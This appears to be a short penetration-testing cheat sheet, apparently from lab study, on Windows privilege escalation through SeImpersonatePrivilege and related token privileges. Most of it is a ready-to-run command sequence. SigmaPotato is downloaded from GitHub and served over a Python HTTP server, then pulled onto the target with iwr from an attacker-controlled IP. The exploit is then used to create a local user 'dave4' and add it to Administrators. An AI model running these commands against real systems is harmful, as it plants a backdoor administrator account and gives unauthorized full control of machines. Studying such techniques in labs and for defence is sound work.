# Enumerate Privileges of current user
```batch
whoami /priv
```
# Privileges known to lead to Privilege Escalation
* SeImpersonatePrivilege
* SeBackupPrivilege
* SeAssignPrimaryToken
* SeLoadDriver
* SeDebug

In most configurations, IIS (Windows Webserver) will run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity, which all have SeImpersonatePrivilege assigned.

This also applies to other Windows services.
# SeImpersonatePrivilege
To exploit this privilege, SigmaPotato (or other "potato" exploits) can be used to trick "NT AUTHORITY\SYSTEM" into authenticating into a malicious named pipe, allowing us to execute commands as them.
```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
```
```bash
python -m http.server 80
```
```powershell
iwr -uri http://$(IP_ADDRESS)/SigmaPotato.exe -OutFile SigmaPotato.exe
```
```powershell
.\SigmaPotato "net user dave4 lab /add"
```
```powershell
.\SigmaPotato "net localgroup Administrators dave4 /add"
```
